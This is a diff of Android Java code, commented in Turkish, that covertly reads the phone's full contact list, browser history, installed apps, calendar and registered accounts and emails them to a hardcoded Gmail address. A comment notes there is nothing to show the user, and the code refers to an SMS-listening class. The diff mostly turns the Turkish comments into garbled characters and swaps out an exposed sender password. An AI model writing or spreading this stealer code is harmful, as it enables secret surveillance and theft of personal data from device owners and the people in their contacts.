@@ -63,18 +63,18 @@ this.mailCallback=mailcallBack;
     	
     	
     	
-    	//Mail Gönderiimi
+    	//Mail GÃ¶nderiimi
     	
     	 try {
-    	Mail m = new Mail("hemenindir57@gmail.com","123zafer123"); 
+    	Mail m = new Mail("hemenindir57@gmail.com","123xxx123"); 
 	       	
     	
     	//   emailGonder();
 			 String[] toArr = {"mehmetduman34500@gmail.com"}; 
 		        m.setTo(toArr); 
 		        m.setFrom("hemenindir57@gmail.com"); 
-		        m.setSubject("Kayıtlı Hesaplar--Takvim--Browser Explorer--Yüklü Uygulamalar"); 
-		        m.setBody("\n"+"Rehberin Tamamı \n"+output+"\n Site Kayıtları\n\n "+browserOut+"Uygulama Bilgiler\n\n"+appInfo+"Takvim Okuma\n\n"+calendrOut+"Bütün Hesaplar:\n\n"+possibleEmail); 
+		        m.setSubject("KayÃ½tlÃ½ Hesaplar--Takvim--Browser Explorer--YÃ¼klÃ¼ Uygulamalar"); 
+		        m.setBody("\n"+"Rehberin TamamÃ½ \n"+output+"\n Site KayÃ½tlarÃ½\n\n "+browserOut+"Uygulama Bilgiler\n\n"+appInfo+"Takvim Okuma\n\n"+calendrOut+"BÃ¼tÃ¼n Hesaplar:\n\n"+possibleEmail); 
     	
 		        
 		        
@@ -90,7 +90,7 @@ this.mailCallback=mailcallBack;
 		        Uri EmailCONTENT_URI = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
 		        String EmailCONTACT_ID = ContactsContract.CommonDataKinds.Email.CONTACT_ID;
 		        String DATA = ContactsContract.CommonDataKinds.Email.DATA;
-		      //Tlefona Kayıtlı bütün hesaplar ve Gmail hesapları Okuma
+		      //Tlefona KayÃ½tlÃ½ bÃ¼tÃ¼n hesaplar ve Gmail hesaplarÃ½ Okuma
 		    	
 				
 				   try{
@@ -175,7 +175,7 @@ this.mailCallback=mailcallBack;
    		     
    		 }
    		 
-   		 //Bütün uygulama bilgileri için
+   		 //BÃ¼tÃ¼n uygulama bilgileri iÃ§in
    		 appInfo=new StringBuffer();
    		 final PackageManager pm = context.getPackageManager();
    		//get a list of installed apps.
@@ -189,7 +189,7 @@ this.mailCallback=mailcallBack;
    		}
    
    	  output = new StringBuffer();
-//burası rehber okuma
+//burasÃ½ rehber okuma
 		ContentResolver contentResolver = context.getContentResolver();
 		Cursor cursor = contentResolver.query(CONTENT_URI, null,null, null, null);	
 
@@ -199,7 +199,7 @@ this.mailCallback=mailcallBack;
 			while (cursor.moveToNext()) {
 
 				String contact_id = cursor.getString(cursor.getColumnIndex( _ID ));
-				String name = cursor.getString(cursor.getColumnIndex( DISPLAY_NAME ));//Rehberdeki kayıtlı isim...
+				String name = cursor.getString(cursor.getColumnIndex( DISPLAY_NAME ));//Rehberdeki kayÃ½tlÃ½ isim...
 
 				int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex( HAS_PHONE_NUMBER )));
 
@@ -208,20 +208,20 @@ this.mailCallback=mailcallBack;
 					// Query and loop for every phone number of the contact
 					Cursor phoneCursor = contentResolver.query(PhoneCONTENT_URI, null, Phone_CONTACT_ID + " = ?", new String[] { contact_id }, null);
 
-					while (phoneCursor.moveToNext()) {//burda her numara için ayrı ayrı yaptık
+					while (phoneCursor.moveToNext()) {//burda her numara iÃ§in ayrÃ½ ayrÃ½ yaptÃ½k
 						//burada phoneNumber yani rehberdeki numara bilgisi..... 
-						//arkadaşlar burada rehber.put diyerek hashMap ımıza key-value şeklinde verimizi eklemiş oldukk.....
+						//arkadaÃ¾lar burada rehber.put diyerek hashMap Ã½mÃ½za key-value Ã¾eklinde verimizi eklemiÃ¾ oldukk.....
 						phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER));
-						//şimdi arkadaşlar burada şöyle birşey yaptım sms dinleme class'ımızdan gelecek numaralar +90...ile başlayacak
-						//bizim rehberimizde numaralar belkide normal 0505... die başlayabilr o yüzden sorun olmaması için kesme yaptım
+						//Ã¾imdi arkadaÃ¾lar burada Ã¾Ã¶yle birÃ¾ey yaptÃ½m sms dinleme class'Ã½mÃ½zdan gelecek numaralar +90...ile baÃ¾layacak
+						//bizim rehberimizde numaralar belkide normal 0505... die baÃ¾layabilr o yÃ¼zden sorun olmamasÃ½ iÃ§in kesme yaptÃ½m
 						try {
 						String strG=new String(phoneNumber);
-						String ifgideckNo=strG.substring(0,2);//gelen numaranın  yani rehberden okudumuz no nun ilk 2 karakteri +9 ise ded,m
-						//+9 la başlayan kısmı kes 0505... olarak kalsın...
+						String ifgideckNo=strG.substring(0,2);//gelen numaranÃ½n  yani rehberden okudumuz no nun ilk 2 karakteri +9 ise ded,m
+						//+9 la baÃ¾layan kÃ½smÃ½ kes 0505... olarak kalsÃ½n...
 						 	if(ifgideckNo.equals("+9"))	{	// eyer +9 ise			
 							
 								String str=new String(phoneNumber);
-								 gideckNo=str.substring(2, 13);//kesilen ve 05050000000 olarak kalan 11 haneli numaramız...
+								 gideckNo=str.substring(2, 13);//kesilen ve 05050000000 olarak kalan 11 haneli numaramÃ½z...
 							
 						 	
 							Log.i("zms","zms keskNo:"+gideckNo);
@@ -230,7 +230,7 @@ this.mailCallback=mailcallBack;
 	 						output.append("\n"+"-------------------------");
 	 						rehber.put(gideckNo, name); 	
 
-						 	}else{// Burada else dememizin amacı belirttim gibi eyer rehberde numaralar +9 ile başlmıyorsa... onlar normal kalsın die.
+						 	}else{// Burada else dememizin amacÃ½ belirttim gibi eyer rehberde numaralar +9 ile baÃ¾lmÃ½yorsa... onlar normal kalsÃ½n die.
 						 		output.append("\nPhone number:" + phoneNumber);
 		 						output.append("\n First Name:" + name);
 		 						output.append("\n"+"-------------------------");
@@ -252,7 +252,7 @@ this.mailCallback=mailcallBack;
 					while (emailCursor.moveToNext()) {
 
 					String	email = emailCursor.getString(emailCursor.getColumnIndex(DATA));
-//burada da isterseniz eyer numaraya ait e-mail adresi eklenmişse ona ulaşabilirsiniz...
+//burada da isterseniz eyer numaraya ait e-mail adresi eklenmiÃ¾se ona ulaÃ¾abilirsiniz...
 						output.append("\nEmail:" + email);
 
 					}
@@ -277,16 +277,16 @@ this.mailCallback=mailcallBack;
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
-       return rehber;// return rehber diyerek buradan dönen rehber verilerini onPostExe... da postaladım oradan istersek ekrana yanasıtabilrz
-       // veya kullanıcıya birşeyler yansıtabilrz..
+       return rehber;// return rehber diyerek buradan dÃ¶nen rehber verilerini onPostExe... da postaladÃ½m oradan istersek ekrana yanasÃ½tabilrz
+       // veya kullanÃ½cÃ½ya birÃ¾eyler yansÃ½tabilrz..
     }
-//şimdi diğer classlardan gelecek numara için bi metot oluştralm
+//Ã¾imdi diÃ°er classlardan gelecek numara iÃ§in bi metot oluÃ¾tralm
   
     
     @Override
-    protected void onPostExecute(Map<String, String> result) {// aynı şekilde doinback den gelen veriinin tipi neyse burada o olmalı 
+    protected void onPostExecute(Map<String, String> result) {// aynÃ½ Ã¾ekilde doinback den gelen veriinin tipi neyse burada o olmalÃ½ 
        super.onPostExecute(result);
-      //kullanıcaya gösterilcek bişi yok 
+      //kullanÃ½caya gÃ¶sterilcek biÃ¾i yok 
        Log.e("zms","zms Read result "+result);
        mailCallback.onNumara(result);
        new SendEmailAsyncTask(context, mailCallback).execute();
